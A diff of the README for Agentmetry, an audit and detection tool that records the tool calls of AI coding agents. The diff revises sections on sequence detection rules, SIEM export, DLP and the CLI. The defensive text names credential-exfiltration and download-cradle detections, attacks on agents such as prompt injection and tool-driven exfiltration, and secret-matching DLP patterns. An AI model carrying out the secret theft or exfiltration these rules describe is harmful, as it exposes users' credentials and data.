-| 🧬 **MITRE ATLAS labels** | 5 ATLAS techniques on the AI-specific subset: indirect prompt injection, agent-tool credential harvesting, exfiltration and destruction via tool invocation, and MCP supply-chain rug pull. Absent on everything else, deliberately |
-| 🔐 **Argument hashing** | SHA-256 of tool args by default; plaintext never crosses the wire from hooks |
-| 📡 **SIEM-native export** | Elastic ECS, Splunk HEC, Google SecOps UDM, CloudEvents, generic webhook, alert webhook; Loki/LogQL via Alloy file tail |
-| 🔁 **Evidence** | Tamper-evident evidence pack export and a compliance digest for control review |
-| 🧾 **Inclusion proofs** | RFC 6962 Merkle proof for a single event (`agentmetry prove`): prove one tool call without disclosing the trail |
-| 🔌 **Reads other recorders** | Ingests [Microsoft Agent Governance Toolkit](https://github.com/microsoft/agent-governance-toolkit) audit files, verifying their chain first (`agentmetry import-agt`) |
-| 👥 **Multi-IDE support** | `agentmetry hooks install` writes hook configs for every supported agent on the machine; Antigravity uses `scripts/install_antigravity_hooks.ps1` on Windows. Booting the orchestrator does not touch your hook configs unless `AGENTMETRY_AUTO_INSTALL_HOOKS=1`. Codex installs the same way and additionally needs its `/hooks` trust prompt approved, since it skips untrusted hooks silently ([setup](docs/agentmetry-external-ingest.md#openai-codex-cli)) |
+| Windows | CI on `windows-latest`, plus the `hooks-windows` job. PyPI classifier `Operating System :: Microsoft :: Windows`. |
+| Linux | CI on `ubuntu-latest`, plus the `install-linux` job. PyPI classifier `Operating System :: POSIX :: Linux`. |
+| macOS | The code has a per-user data directory, a launchd agent (`agentmetry install`), managed-hook paths, and `scripts/install.sh` runs there. CI has no macOS job. PyPI does not list a macOS classifier. Treat macOS as untested. |
 
-### Integrations
+CI is `.github/workflows/ci.yml`. The matrix is `ubuntu-latest` and `windows-latest` only.
 
-| Category | Supported today | Roadmap |
-| -------- | --------------- | ------- |
-| **IDE / Agent hosts** | Claude · Cursor · Codex · Antigravity · [Qwen · Kimi · Qoder · CodeBuddy](docs/integrations/chinese-agents.md) | Windsurf · VS Code Copilot |
-| **Agent frameworks** | [CrewAI](adapters/crewai/) · [OpenSRE](adapters/opensre/) · Microsoft AGT audit files (Semantic Kernel, AutoGen, LangGraph via AGT) | LangChain · AutoGen native |
-| **Agent runtimes** | [Herdr](https://herdr.dev) — agents run unchanged under its persistent terminal runtime; hook capture verified from a Herdr pane ([#216](https://github.com/blitzcrieg1/agentmetry/issues/216)) | Role/workspace tagging + cross-agent orchestration adapter ([#216](https://github.com/blitzcrieg1/agentmetry/issues/216)) |
-| **MCP transport** | Stdio audit proxy (wrap any MCP server command) | SSE / streamable HTTP proxy |
-| **Observability / SIEM** | Loki · Grafana · Elastic ECS · Splunk HEC · Google SecOps (UDM) · CloudEvents v1.0 (Knative, EventBridge, Event Grid, Dapr, Kafka) · generic webhook | Datadog · New Relic |
-| **Detection formats** | In-engine sequence rules · LogQL · Elastic · Splunk · [Sigma pack](docs/integrations/sigma/README.md) (23 rules) | STIX/TAXII export |
-| **Policy engines** | Regex DLP manifest (`agentmetry/policies/dlp/`) · tool allow/deny YAML (`agentmetry/policies/tool/`) | OPA / Rego policy-as-code |
-| **Compliance docs** | [ISO 42001 mapping](docs/compliance/iso-42001-mapping.md) · [AI Act checklist](docs/compliance/ai-act-deployer-checklist.md) | SOC 2 evidence templates |
+## What you get
 
-Agentmetry is community-built. Browse [open issues](https://github.com/blitzcrieg1/agentmetry/issues) or the [roadmap](ROADMAP.md).
+- **Sequence detections.** Fourteen published rules, plus one experimental rule (`autonomous-unapproved-write`) that stays registered and is not part of the published set: no IDE capture surface produces the signal it reads, and it is not exported to Sigma. Rules match ordered steps inside a session. `credential-exfil` is credential access, then network egress. Reversed, it does not fire. The list is [docs/detection-rules.md](docs/detection-rules.md).
+- **MITRE ATT&CK tags** on tool calls the mapper recognises (`agentmetry/core/audit/mitre.py`). A call it does not recognise carries no tag.
+- **MITRE ATLAS labels** on the subset where ATLAS says something ATT&CK cannot (`agentmetry/core/audit/atlas.py`, content release 2026.07). Five techniques are emitted: indirect prompt injection (`AML.T0051.001`), agent-tool credential harvesting (`AML.T0098`), exfiltration via tool invocation (`AML.T0086`), destruction via tool invocation (`AML.T0101`), and MCP supply-chain rug pull (`AML.T0109`). `AML.T0050` and `AML.T0053` are deliberately not emitted.
+- **Canonical events, schema 1.2.0.** SHA-256 argument hashes by default. The secret value is not stored. Schema: [docs/agentmetry-event-schema.md](docs/agentmetry-event-schema.md).
+- **SIEM and webhook export.** File (default, hash-chained JSONL), generic webhook, Elastic ECS, Splunk HEC, Google SecOps UDM, Microsoft Sentinel (not yet run against a live workspace), and CloudEvents v1.0 as a webhook format. Loki is Grafana Alloy tailing the local file, not a native sink. The same list is in the table below.
+- **Claude Code OpenTelemetry ingest.** `agentmetry otel` is a loopback OTLP/HTTP JSON receiver. It shipped in 0.9.0. It does not export Agentmetry's own events as OTLP. That direction is not built.
+- **Evidence.** `agentmetry verify --trail` checks the hash chain. `agentmetry anchor` publishes a checkpoint the host cannot rewrite. `agentmetry prove` is an inclusion proof for one event. `agentmetry export --evidence` writes an evidence pack. `agentmetry export --compliance-digest` is a period summary.
 
----
+## Checked claims
 
-## Behavioral Detection Engine
-
-Per-event MITRE tags say *what* a single tool call is. The detection engine says what a **sequence** of calls means: the signal an EDR cannot see because it never had the agent's session boundary.
-
-Rules run **as events arrive**. A firing rule is emitted once per session as a first-class canonical event (`action.type: detection`, `action.outcome: <severity>`) down the same sinks as everything else, so it reaches your SIEM, your alert webhook, and the live feed without anyone opening a dashboard. The same findings are recomputed from the trail on `GET /audit/detections/{correlation_id}`.
-
-Matching is **ordered within a session**, not a threshold on one row.
-`credential-exfil` requires credential access (T1552) *then* network egress
-(TA0011), in that order. Reversed, it does not fire.
-
-Fourteen published rules ship today, plus one held back as experimental and
-the YAML count rules. They cover credential exfiltration, guardrail bypass,
-download cradles, supply-chain merges, recon-then-collect, and both published
-[Agent Data Injection](https://arxiv.org/abs/2607.05120) chains.
-
-**[Every rule, how ordered matching works, and the research behind it →](docs/detection-rules.md)**
-
-That page also maps this project against the
-[OWASP Agentic Skills Top 10](https://owasp.org/www-project-agentic-skills-top-10/):
-two risks covered, three partial, and five that are somebody else's job.
-
-```http
-GET /api/v1/audit/detections/{correlation_id}
-```
-
-### Triage: what the human decided
-
-A detection nobody answered is an alert, not a control. Every finding carries a
-disposition, set from the Detections tab, the CLI, or over the API:
-
-| Status | Meaning |
-| ------ | ------- |
-| `new` | Nobody has looked at it yet. This is the number that matters. |
-| `acknowledged` | Seen, not yet worked. |
-| `in_progress` | Under investigation. |
-| `resolved` | Handled. |
-| `false_positive` | Not a real finding. **Requires a written reason.** |
-| `risk_accepted` | Real, and we are choosing to live with it. **Requires a written reason.** |
-
-```http
-POST /api/v1/audit/detections/disposition
-{"correlation_id": "...", "rule_id": "credential-exfil",
- "status": "risk_accepted", "note": "known internal test harness"}
-```
-
-```bash
-agentmetry disposition run-42 credential-exfil \
-  --status risk_accepted --note "known internal test harness"
-```
-
-Three properties make this evidence rather than a checkbox:
-
-1. **The decision is an event.** Each change is appended to the trail as
-   `action.type: detection_disposition` before anything else happens, so it
-   lands on the same hash chain as the finding it answers and forwards to your
-   SIEM with the new status in `action.outcome`. You can alert on
-   `action.type:detection_disposition AND action.outcome:risk_accepted`.
-   A [Sigma rule](docs/integrations/sigma/agentmetry_disposition_risk_accepted.yml)
-   ships for this pattern.
-2. **History is append-only.** A disposition is superseded, never edited.
-   "False positive" later becoming "confirmed" is exactly the transition that
-   matters, so both survive.
-3. **Closing a finding costs a sentence.** `false_positive` and `risk_accepted`
-   are refused without a note, in the UI and in the API. An unexplained
-   dismissal is not a disposition.
-
-`agentmetry export --compliance-digest` leads with the untriaged count, and
-`agentmetry doctor` reports the backlog. The SQLite table is an index: the trail
-is the record, replayed into the index on orchestrator startup and at any time
-via `rebuild_from_trail()`.
-
-### Check the rules yourself
-
-Detection claims are cheap. This one is checkable from a clean clone:
-
-```bash
-agentmetry benchmark
-```
-
-It replays a corpus of recorded sessions through the real rule engine and prints
-what fired:
+These are the numbers from commands, not from a slide.
 
 ```
   cases            54 (26 attack, 28 benign)
@@ -720,223 +123,122 @@ what fired:
   false positives  0
 ```
 
-The benign half is the number that matters. Any tool can fire on an attack; the
-question is what it does on a normal working day, because a feed that cries wolf
-gets muted and then it is not a control at all. The corpus deliberately includes
-the cases that are easy to get wrong: a credential read *after* network egress
-rather than before (ordering must matter), a read followed by a call to
-localhost (loopback is not exfiltration), a fetch followed by `pip install`
-(not every download is a cradle), and a thirty-call session that must not trip a
-burst rule by length alone.
+That block is what `agentmetry benchmark` printed from the PyPI 0.9.4 package and from this tree. "Rules covered 13" counts rule ids named in corpus expectations. Twelve of those are published rules. The thirteenth is the experimental rule. Two published rules have no corpus case: `host-subagent-swarm-burst` and `off-hours-activity`. They are named in `apps/orchestrator/tools/generate_sigma_pack.py` so the Sigma pack still has them.
 
-Two cases exist because they caught real bugs. One gives both events the same
-timestamp, which is routine on Windows where clock granularity is around 15 ms;
-sequence ordering was once broken by a random UUID, so that case fired or did
-not at random. The other strips `tool.command` entirely, which is the default
-privacy configuration, so the rules have only hook-side trait labels to work
-with. Neither was catchable by a unit test that hand-builds events.
+1638 tests collected (`pytest --collect-only -q` from `apps/orchestrator`). A full run on Python 3.12 reported 1630 passed and 8 skipped, and 82% line coverage (`pytest -q --cov=agentmetry --cov-report=term`). CI fails the coverage job under 78%.
 
-Corpus and expectations live in
-[`apps/orchestrator/agentmetry/core/audit/detection/corpus/`](apps/orchestrator/agentmetry/core/audit/detection/corpus/).
-Adding a case is a JSONL session plus a few lines of YAML, and CI fails on any
-missed rule or any false positive.
+The corpus and the expectations live in [`apps/orchestrator/agentmetry/core/audit/detection/corpus/`](apps/orchestrator/agentmetry/core/audit/detection/corpus/).
 
-## Data Loss Prevention (DLP)
+## What it does not do
 
-Agentmetry ships a local regex DLP engine that scans tool arguments **before** they are executed or logged. When a match fires in `block` mode, the hook denies execution and emits a `tool_denied` event.
+**Not a sandbox.** The default is detect and record. DLP and tool policy can deny a call at the hook, before it runs, when set to `block`. That is off by default (`log`). An after-the-fact hook cannot deny a tool that already ran.
 
-```mermaid
-flowchart LR
-  HOOK["Pre-tool hook"] --> SCAN["DLP Scanner<br/>agentmetry/policies/dlp/manifest.yaml"]
-  SCAN -->|match + block| DENY["tool_denied<br/>reason: dlp:rule_id"]
-  SCAN -->|pass| EXEC["Tool executes + audit log"]
-  SCAN -->|match + log| WARN["Audit + allow<br/>(observe mode)"]
-```
+**Not a CASB.** Hooks are cooperative. No event is not evidence that nothing happened.
 
-| Env | Default | Description |
-| --- | ------- | ----------- |
-| `AGENTMETRY_DLP_MODE` | `log` | `log` · `block` · `disable` |
-| `AGENTMETRY_DLP_PII` | `1` | Enable PII rules (SSN, etc.) |
-| `AGENTMETRY_DLP_RULES_PATH` | `agentmetry/policies/dlp/manifest.yaml` | Custom rule manifest |
+**Not a console.** There is no central enforcement and no central triage in this package. Policy is per machine. See [fleet via your SIEM](docs/integrations/fleet-via-siem.md).
 
-Rules cover AWS keys, GitHub PATs, Slack tokens, bearer headers, private keys, and US SSN patterns. Add custom regex rules without touching Python: drop entries into the manifest.
+**Approvals are mostly inferred.** A tool that runs after a prompt is marked `inferred:*` and is not a record of a click. Claude Code's OTel stream is the exception: a person's yes is stored as an observed approval (`otel_decision:*`).
 
-### Tool allow/deny policy
+**The chain is not attribution.** Verification catches in-place edits, inserted or reordered lines, and forged appends. Anyone who can rewrite the file and the sidecar can produce a trail that verifies. `agentmetry anchor` is the check for that. The chain also does not prove who wrote a line.
 
-Structural tool policy runs **before** DLP at the hook boundary. Deny rules match tool names (glob) and optional shell command regex.
+What a token holder can and cannot claim is narrower than it sounds. `ExternalIngestBody` in `agentmetry/api/routes/audit.py` has no `host_id` or `fleet_id` field, and `agentmetry/core/audit/identity.py` stamps each event with the receiving orchestrator's hostname and its configured `fleet_id`. A client cannot claim to be another machine. It can claim another user: the hook reports the account that ran the agent, and `initiator.operator_source` says whether that id came from the caller (`hook_os`, `hook_configured`, `client`) or from the orchestrator. Anyone holding the API token can inject events that arrive stamped as the machine that accepted them.
 
-| Env | Default | Description |
-| --- | ------- | ----------- |
-| `AGENTMETRY_TOOL_POLICY_MODE` | `log` | `log` · `block` · `disable` |
-| `AGENTMETRY_TOOL_POLICY_PATH` | `agentmetry/policies/tool/manifest.yaml` | Custom allow/deny manifest |
+**MITRE coverage is narrow on purpose.** It is not an official mapping and has not been through a MITRE evaluation.
 
-In `block` mode, a matching deny rule denies the call in the agent's own hook format (`hookSpecificOutput.permissionDecision` on Claude Code, `permission` on Cursor), the same path as DLP block. A rule can also `ask`, which shows the agent's own approval prompt where that is verified to work and is enforced as deny everywhere else; `agentmetry doctor` lists which.
+**Microsoft Sentinel** has a sink and KQL docs. It has not yet run against a live workspace.
 
----
+## Forwarding
 
-## Dashboard
+The JSONL trail is the system of record. Network sinks tail it from a cursor and retry. The cursor moves only after a batch is accepted. `GET /api/v1/audit/status` reports each sink.
 
-The Next.js dashboard at `:3000` gives SOC analysts a live view of agent activity:
+| Sink | Configuration |
+| --- | --- |
+| File (default) | `AGENTMETRY_AUDIT_SINK=file` |
+| Webhook | `AGENTMETRY_AUDIT_SINK=webhook` and `AGENTMETRY_AUDIT_WEBHOOK_URL` |
+| Enterprise batch webhook | webhook sink plus `AGENTMETRY_AUDIT_WEBHOOK_FORMAT=batch` (`{"events": [...]}`) |
+| CloudEvents | webhook sink plus `AGENTMETRY_AUDIT_WEBHOOK_FORMAT=cloudevents` |
+| Elastic ECS | `AGENTMETRY_AUDIT_SINK=elastic` |
+| Splunk HEC | `AGENTMETRY_AUDIT_SINK=splunk` |
+| Google SecOps | `AGENTMETRY_AUDIT_SINK=chronicle` |
+| Microsoft Sentinel | `AGENTMETRY_AUDIT_SINK=sentinel`. [Setup](docs/integrations/sentinel.md). Not yet run against a live workspace. |
+| Loki | Not a sink mode. Grafana Alloy tails the JSONL. [Homelab notes](docs/integrations/loki-homelab.md). |
 
-| View | Features |
-| ---- | -------- |
-| **Event stream** | Real-time audit tail, detections strip, event histogram, color-coded source badges (Claude, Cursor, Codex, Antigravity), outcome filters, split-pane inspector, CSV/JSONL export |
-| **Detections** | Triage panel for correlated findings: severity, rule ID, session drill-down; open a row to jump to the event stream |
-| **Analytics** | Outcome distribution, MITRE tactic chart, session ID search, weekly dogfood stats strip (same data as `agentmetry stats --days 7`) |
-| **Column manager** | Drag-and-drop column layout featuring built-in fields for model, skill, host, MCP server, and failure reasons; reorder or hide via the Columns settings panel |
-| **Process Tree** | Horizontal React Flow timeline of events within a selected session |
+Guides: [docs/integrations/](docs/integrations/). Detections are also a [Sigma pack](docs/integrations/sigma/README.md) (23 rules): 15 generated files for the 14 published sequence rules (`encoded-command-download` is two severities), plus 8 rules for recorder health and triage.
 
-Dark mode supported with theme toggle. Logo and panels adapt automatically.
+`agentmetry otel` receives Claude Code's stream. It does not replace hooks for policy. Mapped today: `tool_result` becomes `tool_called` or `tool_failed` (arguments only if `OTEL_LOG_TOOL_DETAILS=1`); a person's yes on `tool_decision` becomes an observed approval. Other documented types are counted, not dropped silently. Prompts are not forwarded. `--print-env` and `--print-mapping` print the rest.
 
----
+## Dashboard recording
 
-## Forwarding to a SIEM
+The player below is the local dashboard (event stream, detections, live feed). The CLI demo is the 90-second video at the top.
 
-For agents captured via IDE hooks (the common case), the canonical JSONL trail is the **system of record**; `audit.db` indexes the same events for fast dashboard queries.
+<!--
+  Bare github.com/user-attachments URL, on its own line. See docs/readme-media.md.
+-->
 
-The trail is also the queue. Every network sink below is fed by its own forwarder that tails the trail from a cursor kept in `forward-cursors/` beside it, sends in batches, and retries with exponential backoff (capped at five minutes) while the SIEM is down. The cursor moves only after the SIEM accepts a batch, so an outage delays events rather than losing them; delivery is at-least-once. An event a SIEM rejects as malformed goes to `forward-cursors/<sink>.deadletter.jsonl` instead of blocking the rest. `GET /api/v1/audit/status` reports each sink's last forwarded `seq` and how long it has been failing. `AGENTMETRY_AUDIT_FORWARDER=0` restores the old inline, one-request-per-event sinks.
+https://github.com/user-attachments/assets/edd2002e-47c1-4885-8500-b3651f648018
 
-The trail can rotate into segments (`agentmetry trail rotate`, or `AGENTMETRY_TRAIL_ROTATE_BYTES`) without breaking the chain, anchors or verification; nothing is ever deleted automatically. See [docs/trail-retention.md](docs/trail-retention.md).
-
-| Sink | Env |
-|------|-----|
-| **File (default)** | `AGENTMETRY_AUDIT_SINK=file`: hash-chained JSONL (`agentmetry verify --trail`) |
-| **Webhook** | `AGENTMETRY_AUDIT_SINK=webhook` + `AGENTMETRY_AUDIT_WEBHOOK_URL=...`; optional `AGENTMETRY_AUDIT_WEBHOOK_TOKEN=...` sends `Authorization: Bearer <token>` on every POST (hosted-ingest auth) |
-| **Agentmetry Enterprise console** | the webhook sink plus `AGENTMETRY_AUDIT_WEBHOOK_FORMAT=batch`: one POST of `{"events": [...]}` per batch, which the console dedupes on `event_id` |
-| **CloudEvents** | the webhook sink plus `AGENTMETRY_AUDIT_WEBHOOK_FORMAT=cloudevents`: CloudEvents v1.0 structured envelopes (`application/cloudevents+json`) for Knative, EventBridge, Event Grid, Dapr or Kafka. The canonical event still travels whole in `data` |
-| **Elastic ECS** | `AGENTMETRY_AUDIT_SINK=elastic` + `AGENTMETRY_AUDIT_ELASTIC_URL` + `AGENTMETRY_ELASTIC_API_KEY` |
-| **Splunk HEC** | `AGENTMETRY_AUDIT_SINK=splunk` + `AGENTMETRY_AUDIT_SPLUNK_HEC_URL` + `AGENTMETRY_SPLUNK_HEC_TOKEN` |
-| **Microsoft Sentinel** | `AGENTMETRY_AUDIT_SINK=sentinel` + `AGENTMETRY_AUDIT_SENTINEL_*` (Logs Ingestion API, custom table `Agentmetry_CL`). [Setup](docs/integrations/sentinel.md) and [KQL analytics rules](docs/integrations/detections-sentinel.md); not yet run against a live workspace |
-| **Google SecOps (Chronicle)** | `AGENTMETRY_AUDIT_SINK=chronicle` + `AGENTMETRY_CHRONICLE_CUSTOMER_ID` + a service account. Posts UDM directly to `udmevents`, so there is no CBN parser to maintain in your tenant ([setup](docs/integrations/google-secops.md)) |
-| **Alert webhook** | `AGENTMETRY_AUDIT_ALERT_WEBHOOK_URL=...` (fires on denied/error outcomes) |
-
-
-Homelab SIEM with Loki + Grafana:
-
-```powershell
-docker compose -f docker-compose.loki.yml up -d
-# Grafana → http://localhost:3001
-# Explore: {job="agentmetry"} | json
-```
-
-Integration guides → [docs/integrations/](docs/integrations/)
-
-### Running this across a team
-
-Agentmetry keeps its evidence on the machine that produced it, which is
-deliberate but is also the first thing a security engineer asks about. You do
-not want fifteen dashboards.
-
-[**Fleet via your SIEM**](docs/integrations/fleet-via-siem.md) covers the
-pattern: every machine records locally and forwards a copy, and the fleet
-questions get answered where your other detections already live. Set
-`AGENTMETRY_FLEET_ID` per deployment (org or customer). Every event records the
-OS account that ran the agent; set `AGENTMETRY_OPERATOR_ID` to override it, with
-an email or a pseudonym. Set `AGENTMETRY_MCP_INVENTORY=1` to send the MCP servers
-each machine's agents are wired to as an `mcp_inventory` event: at startup, when
-the configuration changes, and daily. It carries server names, launchers, package
-names and hosts, and never arguments or env values. It is off by default because
-the heartbeat deliberately names no server.
-It includes the four queries worth alerting on (including detections nobody triaged, and hosts
-that went quiet), measured storage sizing, and a plain statement of the three
-things it does not give you: no central enforcement, no central triage, and no
-visibility into agents Agentmetry does not hook.
-
----
+From a clone, `python scripts/demo_dashboard.py` seeds a local dashboard. Build `apps/dashboard` first (`npm install && npm run build`). The script says so if the export is missing.
 
 ## CLI Reference
 
-`agentmetry`, installed by `pip install agentmetry` (in a clone, from inside the orchestrator venv):
+`agentmetry` from `pip install agentmetry`. In a clone, use the orchestrator venv.
 
 | Command | What it does |
-|---------|--------------|
-| `agentmetry demo` / `demo --scenario all` | Replay an attack session in-process, then tamper with the trail and watch `verify` catch it. Nothing is kept |
-| `scripts\install.ps1` | Windows one-flow: venv, dashboard deps, IDE hooks, `doctor --fix` |
-| `scripts/install.sh` | Linux/macOS one-flow: same flow, POSIX flags; hooks via `agentmetry hooks install` |
-| `scripts/otel_receiver.py` | Shim for `agentmetry otel`, kept so the prototype's flags still work |
-| `agentmetry start` / `stop` / `status` | Run the orchestrator detached; check health |
-| `agentmetry install` / `uninstall` | Keep the recorder running without you: start at logon, restart within a minute if it dies. Task Scheduler on Windows, a systemd user unit on Linux, a launch agent on macOS. Opt-in, and `doctor` warns when it is absent |
-| `agentmetry serve` | Run in the foreground, logging to a file. What autostart registers; you rarely call it directly |
-| `agentmetry hooks install` | Write IDE hook configs for every supported agent present on this machine. `--agent X` to pick, `--all` to force. This is what a per-user deployment step runs at first logon, when nobody knows in advance which IDEs that developer uses. `agentmetry hooks status` reports coverage as an exit code for deployment tooling: 0 compliant, 1 needs remediation, 2 undeterminable. `--managed` (as administrator) writes Claude Code, Cursor and Codex hooks into each vendor's machine-wide, admin-only location instead, where a developer cannot remove them; `--lock` also stops user and project hooks running |
-| `agentmetry hook <app> <event>` | Forward one IDE hook event to ingest. Hook configs should name the `agentmetry-hook` console script instead, which skips the CLI's imports on a path that runs once per tool call |
-| `agentmetry dashboard` | Open the dashboard signed in: a one-time link sets an HttpOnly session cookie, so the browser never holds the API token. `--no-browser` prints the link |
-| `agentmetry logs -n 50 -f` | Tail the orchestrator log |
-| `agentmetry backup` / `restore` | Zip the data stores and the demo MCP vault; restore one (server stopped) |
-| `agentmetry dogfood` / `--start` | Score the four-week beta gate, or start its clock |
-| `agentmetry stats --days 7` | Weekly audit metrics (events, sessions, detections, DLP/policy blocks) |
-| `agentmetry disposition <correlation_id> <rule_id>` | Close a detection through the API with `--status resolved\|false_positive\|risk_accepted`; false positives and accepted risks require `--note` |
-| `agentmetry replay <correlation_id>` | ASCII timeline of one session from the trail, every segment of it (hook, MCP and OTel events), falling back to the removed runtime's outbox for older runs |
-| `agentmetry export --evidence` | Tamper-evident batch pack (JSON + SHA-256) |
-| `agentmetry export --compliance-digest` | Period governance summary for control review (Markdown; `--json` available) |
-| `agentmetry verify <evidence.json>` | Recompute the integrity hash on an evidence export |
-| `agentmetry verify --trail <audit-forward.jsonl>` | Verify JSONL hash chain, print the Merkle root, and report anchored vs unanchored ranges |
-| `agentmetry trail rotate` / `segments` | Archive the active trail file into `<trail>.archive/` with the chain intact, or list the segments ([retention](docs/trail-retention.md)) |
-| `agentmetry anchor <audit-forward.jsonl>` | Publish a checkpoint committing the trail to a root the host cannot rewrite ([anchoring](docs/anchoring.md)) |
-| `agentmetry otel [--listen-port N] [--keep-command]` | Receive Claude Code's native OpenTelemetry stream and record it, with no hooks installed. `--print-env` prints what Claude Code needs |
-| `agentmetry mcp-proxy [--server NAME] -- <server command>` | Run a stdio MCP server behind Agentmetry: every `tools/call` is recorded with hashed arguments and `tools/list` is fingerprinted. Use it as the command in an MCP client's config |
-| `agentmetry mcp [--digest]` | List the MCP servers the agents on this machine are wired to, and flag entries that resolve code at launch |
-| `agentmetry prove <trail.jsonl> --seq N` | Inclusion proof for one record: prove an event without disclosing the trail |
-| `agentmetry prove <trail.jsonl> --check <proof.json> [--root R]` | Verify a proof, ideally against a root you recorded elsewhere |
-| `agentmetry import-agt <agt.jsonl> [--key K] [--dry-run]` | Ingest a Microsoft Agent Governance Toolkit audit file: verify its hash chain, then run sequence detection over it |
-| `agentmetry doctor` / `doctor --fix` | Preflight checks; `--fix` creates portable `drivers.json` |
-| `agentmetry benchmark` | Replay the recorded detection corpus and score the rules |
+| --- | --- |
+| `agentmetry demo` | Replay an attack session in-process, then tamper with the trail and show `verify` catch it. `--scenario hf` or `--scenario all`. Nothing is kept. |
+| `agentmetry doctor` | Preflight. `--fix` creates a portable `drivers.json` in a checkout. |
+| `agentmetry benchmark` | Replay the detection corpus and score the rules. |
+| `agentmetry start` / `agentmetry stop` / `agentmetry status` | Run the orchestrator detached, stop it, or check health. |
+| `agentmetry serve` | Foreground process that autostart registers. |
+| `agentmetry install` / `agentmetry uninstall` | Start at logon and restart on failure. Task Scheduler on Windows, a systemd user unit on Linux, a launch agent on macOS. |
+| `agentmetry hooks install` | Write hook configs for supported agents found on the machine. `agentmetry hooks status` exits 0, 1, or 2. |
+| `agentmetry hook` | Forward one IDE hook event. Hook configs should call `agentmetry-hook` instead. |
+| `agentmetry otel` | Receive Claude Code's OpenTelemetry stream. No hooks required. |
+| `agentmetry mcp-proxy` | Wrap a stdio MCP server command. |
+| `agentmetry mcp` | List MCP servers configured for agents on this machine. |
+| `agentmetry dashboard` | Open the dashboard signed in. |
+| `agentmetry logs` | Tail the orchestrator log. |
+| `agentmetry stats` | Trail metrics. `agentmetry stats --days 7`. |
+| `agentmetry detections` | List detections for one session, via the API. |
+| `agentmetry disposition` | Set a detection's triage status. `false_positive` and `risk_accepted` require `--note`. |
+| `agentmetry replay` | ASCII timeline of one session from the trail. |
+| `agentmetry export` | `--evidence` or `--compliance-digest`. |
+| `agentmetry verify` | Recompute an evidence-pack hash, or `agentmetry verify --trail` for the JSONL chain. |
+| `agentmetry trail` | `rotate` or `segments`. See [trail retention](docs/trail-retention.md). |
+| `agentmetry anchor` | Publish a checkpoint. See [anchoring](docs/anchoring.md). |
+| `agentmetry prove` | Inclusion proof for one record, or `--check` to verify one. |
+| `agentmetry import-agt` | Ingest a Microsoft Agent Governance Toolkit audit file. |
+| `agentmetry backup` / `agentmetry restore` | Zip the data stores, or restore one with the server stopped. |
+| `agentmetry dogfood` | Score the beta gate, or `--start` its clock. |
 
-`scripts\agentmetry.bat` remains as a legacy alias.
-
-Agentmetry's own trail is anchored publicly at
-[blitzcrieg1/agentmetry-anchors](https://github.com/blitzcrieg1/agentmetry-anchors),
-on a branch where force-push and deletion are blocked, by
-`scripts\publish_anchor.ps1`. A scheduled task runs it every four hours while the
-maintainer's machine is on, and a run with no new records publishes nothing, so
-the commits follow when the machine is in use rather than the clock. The roots
-are there to be checked.
-
----
+Clone installers, not part of the wheel: `scripts/install.ps1` (Windows) and `scripts/install.sh` (Linux and macOS). `scripts/otel_receiver.py` is a shim for `agentmetry otel`.
 
 ## Contributing
 
-Agentmetry welcomes contributions across detection rules, DLP patterns, SIEM adapters, and dashboard UX.
+[CONTRIBUTING.md](CONTRIBUTING.md). Issues: [github.com/blitzcrieg1/agentmetry/issues](https://github.com/blitzcrieg1/agentmetry/issues). Roadmap: [ROADMAP.md](ROADMAP.md).
 
 | Area | Start here |
-| ---- | ---------- |
-| Hook adapters | [docs/agentmetry-external-ingest.md](docs/agentmetry-external-ingest.md) |
-| Framework adapters | [adapters/crewai/](adapters/crewai/) |
-| Event schema | [docs/agentmetry-event-schema.md](docs/agentmetry-event-schema.md) |
-| Detection rules | A benchmark case in `apps/orchestrator/agentmetry/core/audit/detection/corpus/`; the rules are in `apps/orchestrator/agentmetry/core/audit/detection/rules.py` |
+| --- | --- |
+| Hooks | [docs/agentmetry-external-ingest.md](docs/agentmetry-external-ingest.md) |
+| Schema | [docs/agentmetry-event-schema.md](docs/agentmetry-event-schema.md) |
+| Detection rules | [docs/detection-rules.md](docs/detection-rules.md) and the corpus under `apps/orchestrator/agentmetry/core/audit/detection/corpus/` |
 | DLP rules | `apps/orchestrator/agentmetry/policies/dlp/manifest.yaml` |
-| Sigma pack | [docs/integrations/sigma/README.md](docs/integrations/sigma/README.md) |
-| Roadmap | [ROADMAP.md](ROADMAP.md) |
+| Sigma | [docs/integrations/sigma/README.md](docs/integrations/sigma/README.md) |
 
-Run tests before opening a PR; see [CONTRIBUTING.md](CONTRIBUTING.md). **All PRs require a signed [CLA](CLA.md)** (v1.0).
-
----
+PRs need a signed [CLA](CLA.md) (v1.0).
 
 ## Security
 
-Agentmetry is designed for security-sensitive environments:
+The trail stays on the machine unless you set a sink. Tool arguments are SHA-256 by default. Set `AGENTMETRY_HASH_KEY` and the fingerprints are HMAC-SHA256. Every API route except health needs the per-install token or `AGENTMETRY_API_KEY`. `AGENTMETRY_AUTH_DISABLED=1` is for development, and `doctor` flags it.
 
-- **Local-first**: audit data stays on your machine unless you configure forwarders
-- **Argument hashing by default**: plaintext tool args never leave the hook process. Set `AGENTMETRY_HASH_KEY` (one value per fleet) and the fingerprints are HMAC-SHA256 instead of plain SHA-256: pseudonymised, still matchable across the fleet, and not confirmable by hashing a guess without the key
-- **Authenticated by default**: every route but health needs the per-install token (owner-only, in the data directory) or `AGENTMETRY_API_KEY` when you set your own. The dashboard signs in with a one-time link and an HttpOnly session cookie; `AGENTMETRY_AUTH_DISABLED=1` is for development and `doctor` flags it
-- **Hook enforcement (opt-in)**: DLP and tool policy can deny matching tools/secrets at the IDE boundary when set to `block` mode
-- **Tamper-evident exports**: evidence packs include SHA-256 integrity hashes
-
-Report vulnerabilities via GitHub [private vulnerability reporting](https://github.com/blitzcrieg1/agentmetry/security/advisories/new) (Security → Report a vulnerability). Do not open a public issue for security findings. See [SECURITY.md](SECURITY.md).
-
-Compliance docs → [docs/compliance/](docs/compliance/)
-
----
+Report vulnerabilities via [private vulnerability reporting](https://github.com/blitzcrieg1/agentmetry/security/advisories/new). See [SECURITY.md](SECURITY.md).
 
 ## License
 
 Apache-2.0, Copyright 2026 blitzcrieg1. See [LICENSE](LICENSE) and [NOTICE](NOTICE).
 
-Contributors sign the [Individual CLA (v1.0)](CLA.md); companies use [CCLA.md](CCLA.md).
-Trademark policy: [TRADEMARK.md](TRADEMARK.md). Commercial intent (non-binding):
-[COMMERCIAL.md](COMMERCIAL.md).
-
----
+Companies use [CCLA.md](CCLA.md). Trademark: [TRADEMARK.md](TRADEMARK.md). Commercial intent, non-binding: [COMMERCIAL.md](COMMERCIAL.md).
 
 ## Maintainer
 
